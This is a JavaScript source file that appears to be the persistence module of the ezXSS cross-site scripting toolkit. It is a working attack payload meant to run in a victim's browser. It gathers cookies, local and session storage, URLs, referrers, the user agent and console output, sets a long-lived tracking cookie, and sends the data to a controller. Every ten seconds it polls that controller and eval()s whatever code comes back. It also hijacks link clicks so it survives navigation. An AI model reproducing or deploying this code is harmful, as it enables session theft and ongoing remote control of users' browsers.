var last = '';

function ping() {
    try {
        ez_rD.type = 'ping';
        ez_rD.console = console.everything;
        ez_cb(ez_rD, callback);
    } catch (e) {
    }
}

var intervalId = null;

function startPing() {
  if (intervalId === null) {
    intervalId = window.setInterval(ping, 10000);
  }
}

function callback(input) {
    eval(input);
}

function init() {
    // Ready to persist
    ra_hL();
    ez_cb(ez_rD, startPing);
}

function ez_persist() {
    init();
    ping();
}


if (!console.everything) {
    console.everything = "";
    function formatLog(type, args) {
        var date = new Date().toLocaleTimeString();
        return "[" + date + " " + type + "] " + Array.prototype.join.call(args, " ") + "\n";
    }
    function wrapConsoleMethod(method, type) {
        var defaultMethod = console[method];
        console[method] = function () {
            console.everything = formatLog(type, arguments) + console.everything;
            defaultMethod.apply(console, arguments);
        };
    }
    var methods = ["log", "error", "warn"];
    for (var i = 0; i < methods.length; i++) {
        wrapConsoleMethod(methods[i], methods[i].toUpperCase());
    }
}

function ra_client(){var e="ezXSS=",t=document.cookie.split(";");for(var n=0;n<t.length;n++){var r=t[n].replace(/^\s+|\s+$/g,"");if(0==r.indexOf(e)){var o=r.substring(e.length,r.length),a=new Date;a.setFullYear(a.getFullYear()+1),setCookie(e,o,a.toUTCString().replace("GMT",""),"/");return o}}for(var o="",a="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789",n=0;n<16;n++)o+=a.charAt(Math.floor(Math.random()*a.length));var s=new Date;s.setFullYear(s.getFullYear()+1),setCookie(e,o,s.toUTCString().replace("GMT",""),"/");return o}function setCookie(e,t,n,r){var o=e+t+";";n&&(o+="expires="+n+";"),r&&(o+="path="+r+";"),document.cookie=o}

function ra_hL() {
    ez_rD.type = 'init';
    ez_rD.console = console.everything;
    try {
        ez_rD.clientid = ra_client()
    } catch (e) {
        ez_rD.clientid = ""
    }
    try {
        ez_rD.method = "persist"
    } catch (e) {
        ez_rD.method = ""
    }
    try {
        ez_rD.uri = ez_n(location.toString())
    } catch (e) {
        ez_rD.uri = ""
    }
    try {
        ez_rD.cookies = ez_n(document.cookie)
    } catch (e) {
        ez_rD.cookies = ""
    }
    try {
        if (last != '') {
            ez_rD.referer = ez_n(last)
        } else {
            ez_rD.referer = ez_n(document.referrer)
        }
    } catch (e) {
        ez_rD.referer = ""
    }
    try {
        ez_rD["user-agent"] = ez_n(navigator.userAgent)
    } catch (e) {
        ez_rD["user-agent"] = ""
    }
    try {
        ez_rD.origin = ez_n(location.origin)
    } catch (e) {
        ez_rD.origin = ""
    }
    try {
        ez_rD.localstorage = ez_n(window.localStorage);
    } catch (e) {
        ez_rD.localstorage = "";
    }
    try {
        ez_rD.sessionstorage = ez_n(window.sessionStorage);
    } catch (e) {
        ez_rD.sessionstorage = "";
    }
    try {
        ez_rD.dom = "";//ez_n(document.documentElement.outerHTML); //ez_n(document.documentElement.outerHTML)
    } catch (e) {
        ez_rD.dom = ""
    }
    try {
        ez_rD.screenshot = "", ra_c()
        //html2canvas(document.body).then(function (e) {
        //    ez_rD.screenshot = ez_n(e.toDataURL()), ra_c();
        //});
    } catch (e) {
        ez_rD.screenshot = "", ra_c()
    }

    function ra_c() {
        ra_r()
    }
}

function ra_r() {
    document.querySelectorAll('a').forEach(link => {
        link.addEventListener('click', (e) => {
            e.preventDefault();
            let paths = e.path;
            var linkFound = false;
            for (path in paths) {
                for (subpath in path) {
                    if (paths[path].nodeName === 'A') {

                        console.log('A link with target URL ' + paths[path].href + ' was clicked');

                        if (paths[path].hostname === window.location.hostname) {
                            if (paths[path].href.slice(-1) === '#' && paths[path].hash === '') {
                                break;
                            }

                            // Same page click
                            if (paths[path].hash !== "" && paths[path].href.replace(paths[path].hash, '') === window.location.href.split('#')[0]) {
                                var hash = paths[path].hash.replace('#', '');
                                var top = document.getElementById(hash).offsetTop;
                                window.history.pushState("", document.title, paths[path].href);
                                window.scrollTo(0, top);
                                linkFound = true;
                                break;
                            }

                            // Page click on same domain
                            var request = new XMLHttpRequest();
                            request.onload = function () {
                                if (this.readyState == 4) {
                                    last = ez_n(location.toString());
                                    document.getElementsByTagName("html")[0].innerHTML = this.responseText;
                                    window.scrollTo(0, 0);
                                    let title = this.responseText.match(/<title[^>]*>([^<]+)<\/title>/)[1];
                                    document.title = title;
                                    window.history.pushState({ "html": this.responseText, "pageTitle": title }, "", paths[path].href);

                                    let scripts = Array.from(this.responseText.matchAll(/<script[^>]*src=[^>]*>[^>]*<\/script>/g));
                                    for (script in scripts) {
                                        try {
                                            var search = /<script[^>]+src="([^">]+)"/g;
                                            var src = search.exec(scripts[script][0])[1];
                                            var a = document.createElement('script');
                                            a.src = src;
                                            document.body.appendChild(a);
                                        } catch (e) { }
                                    }
                                    init();
                                }
                            };

                            request.onerror = function () {
                                window.open(paths[path].href, '_blank').focus();
                            };

                            request.open('GET', paths[path].href);
                            request.send();
                        } else {
                            // Click to other domain
                            window.open(paths[path].href, '_blank').focus();
                        }
                        linkFound = true;
                        break;
                    }
                }
                if (linkFound) break;
            }
        });
    });

    /**document.querySelectorAll("form").forEach(form => {
        form.addEventListener("submit", event => {
            event.preventDefault(); // prevent the form from redirecting or refreshing the page
            const formData = new FormData(form); // get all data from the form
            const xhr = new XMLHttpRequest();
            xhr.open("POST", form.action);
            xhr.onload = () => {
                if (xhr.status === 200) {
                    console.log('yes!');
                    document.documentElement.innerHTML = xhr.response;


                    console.log('done!');
                } else {
                    alert("An error occurred while processing the form.");
                }
            };
            xhr.send(formData);
        });
    });**/
}